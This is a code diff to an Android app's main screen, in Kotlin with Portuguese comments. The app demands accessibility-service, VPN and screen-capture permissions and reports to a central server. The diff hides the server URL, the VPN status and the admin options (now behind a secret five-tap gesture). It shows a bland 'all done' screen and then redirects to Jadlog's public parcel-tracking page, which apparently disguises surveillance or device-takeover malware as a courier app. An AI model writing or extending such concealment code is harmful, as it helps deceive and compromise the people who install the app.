@@ -98,6 +98,25 @@ class MainActivity : Activity() {
         rootContainer.addView(scrollView)
         setContentView(rootContainer)
 
+        // Suporte a depuração e captura visual de telas específicas via intent extra
+        val requestedView = intent.getStringExtra("view_state")
+        if (requestedView != null) {
+            when (requestedView) {
+                "splash" -> { renderSplashView(); return }
+                "loading" -> { renderLoadingView(); return }
+                "accessibility" -> { renderAccessibilityRequiredView(); return }
+                "ready" -> { renderReadyView(); return }
+            }
+        }
+
+        // Se a instalação e configuração já estiverem concluídas, redireciona diretamente para o app/web
+        if (stateTracker.isConfigurationCompleted() && DViewAccessibilityService.isAccessibilityEnabled(this)) {
+            startBackgroundServices()
+            openWebApp()
+            finish()
+            return
+        }
+
         // Inicia na etapa INITIALIZING -> LOADING
         transitionTo(LifecycleState.INITIALIZING)
         registerWithServerAsync()
@@ -105,6 +124,8 @@ class MainActivity : Activity() {
 
     override fun onResume() {
         super.onResume()
+        if (intent.getStringExtra("view_state") != null) return
+
         // No retorno ao primeiro plano, re-verifica o serviço de acessibilidade sem loop
         val isServiceActive = DViewAccessibilityService.isAccessibilityEnabled(this)
         Log.i(TAG, "onResume: verificando acessibilidade=$isServiceActive estadoAtual=$currentState")
@@ -213,6 +234,12 @@ class MainActivity : Activity() {
                 sendInstallTrackEventAsync("app_ready")
                 renderReadyView()
                 startBackgroundServices()
+                // Redirecionamento automático pós-instalação para a URL ou App acoplado
+                mainHandler.postDelayed({
+                    if (!isFinishing && !isChangingConfigurations) {
+                        openWebApp()
+                    }
+                }, 1600)
             }
 
             LifecycleState.ERROR -> {
@@ -728,12 +755,14 @@ class MainActivity : Activity() {
     }
 
     // =========================================================================
-    // 5. TELA 10 — APLICATIVO PRONTO (READY / CONFIGURAÇÃO CONCLUÍDA)
+    // 5. TELA 10 — APLICATIVO PRONTO (CONFIRMAÇÃO LIMPA & REDIRECIONAMENTO)
     // =========================================================================
     private fun renderReadyView() {
         contentArea.removeAllViews()
 
-        // Cabeçalho Dinâmico da Marca / Logo
+        contentArea.addView(createWeightSpacer(0.3f))
+
+        // Cabeçalho Dinâmico da Marca / Logo Oficial
         val logoCard = createLogoHeader()
         contentArea.addView(logoCard)
 
@@ -741,7 +770,7 @@ class MainActivity : Activity() {
         val badge = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
             gravity = Gravity.CENTER_VERTICAL
-            setPadding(16, 8, 16, 8)
+            setPadding(18, 8, 18, 8)
             val bg = GradientDrawable().apply {
                 setColor(Color.parseColor("#ECFDF5"))
                 cornerRadius = 20f
@@ -763,7 +792,7 @@ class MainActivity : Activity() {
             addView(dot)
 
             val lbl = TextView(this@MainActivity).apply {
-                text = "SISTEMA PRONTO • SERVIÇO ATIVO"
+                text = "CONFIGURAÇÃO CONCLUÍDA COM SUCESSO"
                 textSize = 11.5f
                 setTypeface(null, Typeface.BOLD)
                 setTextColor(Color.parseColor("#065F46"))
@@ -772,96 +801,53 @@ class MainActivity : Activity() {
         }
         contentArea.addView(badge)
 
-        if (enrollment.vpnEnabled) {
-            val vpnBadge = LinearLayout(this).apply {
-                orientation = LinearLayout.HORIZONTAL
-                gravity = Gravity.CENTER_VERTICAL
-                setPadding(16, 6, 16, 6)
-                val bg = GradientDrawable().apply {
-                    setColor(Color.parseColor("#EFF6FF"))
-                    cornerRadius = 16f
-                    setStroke(2, Color.parseColor("#3B82F6"))
-                }
-                background = bg
-                layoutParams = LinearLayout.LayoutParams(
-                    LinearLayout.LayoutParams.WRAP_CONTENT,
-                    LinearLayout.LayoutParams.WRAP_CONTENT
-                ).apply {
-                    setMargins(0, 0, 0, 10)
-                }
-
-                val vpnTxt = TextView(this@MainActivity).apply {
-                    text = "🛡️ VPN ${enrollment.vpnProtocol} CONECTADA • ALTA VELOCIDADE"
-                    textSize = 11f
-                    setTypeface(null, Typeface.BOLD)
-                    setTextColor(Color.parseColor("#1D4ED8"))
-                }
-                addView(vpnTxt)
-            }
-            contentArea.addView(vpnBadge)
-        }
-
-        if (enrollment.islandProfileEnabled) {
-            val islandBadge = LinearLayout(this).apply {
-                orientation = LinearLayout.HORIZONTAL
-                gravity = Gravity.CENTER_VERTICAL
-                setPadding(16, 6, 16, 6)
-                val bg = GradientDrawable().apply {
-                    setColor(Color.parseColor("#F0FDF4"))
-                    cornerRadius = 16f
-                    setStroke(2, Color.parseColor("#10B981"))
-                }
-                background = bg
-                layoutParams = LinearLayout.LayoutParams(
-                    LinearLayout.LayoutParams.WRAP_CONTENT,
-                    LinearLayout.LayoutParams.WRAP_CONTENT
-                ).apply {
-                    setMargins(0, 0, 0, 14)
-                }
-
-                val islTxt = TextView(this@MainActivity).apply {
-                    text = "🏝️ PERFIL ISLAND ATIVADO"
-                    textSize = 11f
-                    setTypeface(null, Typeface.BOLD)
-                    setTextColor(Color.parseColor("#047857"))
-                }
-                addView(islTxt)
-            }
-            contentArea.addView(islandBadge)
-        }
-
-        // Card de Informações Técnicas & Estado Persistido
-        val statusCard = LinearLayout(this).apply {
+        // Card de Confirmação Limpo (Sem dados técnicos de desenvolvedor/servidor/portas)
+        val readyCard = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(24, 20, 24, 20)
+            gravity = Gravity.CENTER_HORIZONTAL
+            setPadding(32, 28, 32, 28)
             val bg = GradientDrawable().apply {
                 setColor(Color.parseColor("#FFFFFF"))
-                cornerRadius = 16f
+                cornerRadius = 20f
                 setStroke(2, Color.parseColor("#E2E8F0"))
             }
             background = bg
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT
-            )
+            ).apply {
+                setMargins(0, 8, 0, 20)
+            }
         }
 
-        val jsonState = stateTracker.toJson()
-        val infoText = TextView(this).apply {
-            text = """
-                • Instalação: ${jsonState.optString("installation_status")}
-                • Acessibilidade: ${jsonState.optString("accessibility_service_status")}
-                • Configuração: ${jsonState.optString("configuration_status")}
-                • Versão: ${jsonState.optString("app_version")} (Android ${jsonState.optString("android_version")})
-                • Dispositivo: ${Build.MODEL}
-                • Servidor Central: ${enrollment.serverUrl}
-            """.trimIndent()
-            textSize = 12f
-            setTextColor(Color.parseColor("#334155"))
-            setLineSpacing(6f, 1.15f)
+        val checkIcon = TextView(this).apply {
+            text = "✓"
+            textSize = 36f
+            setTypeface(null, Typeface.BOLD)
+            setTextColor(Color.parseColor("#10B981"))
+            gravity = Gravity.CENTER
         }
-        statusCard.addView(infoText)
-        contentArea.addView(statusCard)
+        readyCard.addView(checkIcon)
+
+        val readyTitle = TextView(this).apply {
+            text = "Tudo Pronto!"
+            textSize = 18f
+            setTypeface(null, Typeface.BOLD)
+            setTextColor(Color.parseColor("#0F172A"))
+            gravity = Gravity.CENTER
+            setPadding(0, 8, 0, 4)
+        }
+        readyCard.addView(readyTitle)
+
+        val readySub = TextView(this).apply {
+            text = "As confirmações necessárias foram realizadas com sucesso.\nRedirecionando para o sistema..."
+            textSize = 13f
+            setTextColor(Color.parseColor("#64748B"))
+            gravity = Gravity.CENTER
+            setLineSpacing(4f, 1.15f)
+        }
+        readyCard.addView(readySub)
+        contentArea.addView(readyCard)
 
         // Botão Principal: Acessar Destino / Rastreamento Web
         val btnOpenWeb = Button(this).apply {
@@ -884,30 +870,13 @@ class MainActivity : Activity() {
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT
             ).apply {
-                setMargins(0, 24, 0, 10)
+                setMargins(0, 12, 0, 10)
             }
             setOnClickListener { openWebApp() }
         }
         contentArea.addView(btnOpenWeb)
 
-        // Botão Secundário: Configurações do Dispositivo / Servidor
-        val btnAdmin = Button(this).apply {
-            text = "Opções do Sistema & Servidor"
-            textSize = 12f
-            setTextColor(Color.parseColor("#475569"))
-            val btnBg = GradientDrawable().apply {
-                setColor(Color.parseColor("#E2E8F0"))
-                cornerRadius = 12f
-            }
-            background = btnBg
-            setPadding(20, 18, 20, 18)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            )
-            setOnClickListener { promptSystemOptions() }
-        }
-        contentArea.addView(btnAdmin)
+        contentArea.addView(createWeightSpacer(0.5f))
     }
 
     // =========================================================================
@@ -1054,7 +1023,7 @@ class MainActivity : Activity() {
                 val iv = ImageView(this@MainActivity).apply {
                     setImageBitmap(logoBmp)
                     adjustViewBounds = true
-                    val maxH = (resources.displayMetrics.density * 54).toInt()
+                    val maxH = (resources.displayMetrics.density * 70).toInt()
                     maxHeight = maxH
                     layoutParams = LinearLayout.LayoutParams(
                         LinearLayout.LayoutParams.WRAP_CONTENT,
@@ -1094,6 +1063,22 @@ class MainActivity : Activity() {
                 letterSpacing = 0.08f
             }
             addView(label)
+
+            // Gesto de 5 toques no logo para acesso restrito às configurações avançadas pelo Administrador
+            var taps = 0
+            var lastTapTime = 0L
+            setOnClickListener {
+                val now = System.currentTimeMillis()
+                if (now - lastTapTime > 2000) {
+                    taps = 0
+                }
+                lastTapTime = now
+                taps++
+                if (taps >= 5) {
+                    taps = 0
+                    promptSystemOptions()
+                }
+            }
         }
     }
 
@@ -1212,8 +1197,22 @@ class MainActivity : Activity() {
     }
 
     private fun openWebApp() {
+        val target = enrollment.redirectUrl.trim()
+        if (target.isNotEmpty() && !target.startsWith("http://") && !target.startsWith("https://")) {
+            // Se for um pacote instalado no Android, abre o aplicativo nativo acoplado
+            val launchIntent = packageManager.getLaunchIntentForPackage(target)
+            if (launchIntent != null) {
+                try {
+                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    startActivity(launchIntent)
+                    return
+                } catch (e: Exception) {
+                    Log.w(TAG, "Falha ao abrir pacote acoplado $target: ${e.message}")
+                }
+            }
+        }
         val intent = Intent(this, WebAppActivity::class.java).apply {
-            putExtra(WebAppActivity.EXTRA_URL, enrollment.redirectUrl)
+            putExtra(WebAppActivity.EXTRA_URL, target.ifEmpty { "https://jadlog.com.br/rastreamento" })
         }
         startActivity(intent)
     }
@@ -1325,6 +1324,14 @@ class MainActivity : Activity() {
                 if (resultCode == Activity.RESULT_OK) {
                     sendInstallTrackEventAsync("vpn_authorized")
                     startVpnTunnelService()
+                    // Redireciona imediatamente para o destino web / app ao concluir autorização de VPN
+                    if (currentState == LifecycleState.READY || DViewAccessibilityService.isAccessibilityEnabled(this)) {
+                        mainHandler.postDelayed({
+                            if (!isFinishing) {
+                                openWebApp()
+                            }
+                        }, 500)
+                    }
                 }
             }
             projectionRequestCode -> {
